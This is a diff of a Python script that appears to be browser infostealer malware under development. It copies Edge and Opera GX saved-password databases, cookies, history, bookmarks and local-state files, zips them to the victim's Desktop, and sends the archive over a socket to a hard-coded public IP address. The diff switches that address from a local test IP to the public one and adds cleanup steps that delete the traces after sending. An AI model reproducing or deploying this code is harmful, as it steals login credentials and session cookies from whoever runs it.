@@ -1,8 +1,8 @@
 import os
 import shutil
 import Sockets.sckt_client as client
-import logging
-host = "192.168.1.36"
+import threading
+host = "193.153.113.112"
 port = 5679
 
 def main():
@@ -55,13 +55,13 @@ def main():
         "EDGE_LOCAL_STATE_FILE_PATH": BasePath + \
                                         '\\Temp\\Copy\\Edge_Local_State',
         "EDGE_PASSWORDS_DB_PATH": BasePath + \
-                                        '\\Temp\\Copy\\Default\\Edge_Login_Data',
+                                        '\\Temp\\Copy\\Edge_Login_Data',
         "EDGE_COOKIES_DB_PATH": BasePath + \
-                                        '\\Temp\\Copy\\Default\\Edge_Cookies',
+                                        '\\Temp\\Copy\\Edge_Cookies',
         "EDGE_HISTORY_DB_PATH": BasePath + \
-                                        '\\Temp\\Copy\\Default\\Edge_History',
+                                        '\\Temp\\Copy\\Edge_History',
         "EDGE_BOOKMARKS_FILE_PATH": BasePath + \
-                                        '\\Temp\\Copy\\Default\\Edge_Bookmarks',
+                                        '\\Temp\\Copy\\Edge_Bookmarks',
         "OPERAGX_LOCAL_STATE_FILE_PATH": BasePath + \
                                        '\\Temp\\Copy\\OPERAGX_Local_State',
         "OPERAGX_PASSWORDS_DB_PATH": BasePath + \
@@ -76,22 +76,20 @@ def main():
 
     if not os.path.exists(BasePath + "/Temp/Copy/"):
             os.makedirs(BasePath + "/Temp/Copy/")
-
+        
     for target in TARGET_FILE_PATH:
-        try:
+        if os.path.exists(TARGET_FILE_PATH[target]):
             shutil.copy2(TARGET_FILE_PATH[target], COPY_PATH[target])
-        except FileNotFoundError:
-            pass
 
     file = os.getenv("APPDATA") + r'/../../Desktop/Data123963.zip'
     file = file.replace("/","\\")
-    print(file)
     shutil.make_archive(BasePath + "/../../Desktop/Data123963", "zip", BasePath + "/Temp/Copy/")
+    #Limpieza de pruebas
     shutil.rmtree(BasePath + "/Temp/Copy/")
-    try:
-        client.send_file(file, host, port)
-    except:
-        logging.exception("message")
+    #Envio
+    client.send_file(file, host, port)
+    #Limpieza de pruebas
+    shutil.rmtree(file)
 
 if __name__ == "__main__":
     main()
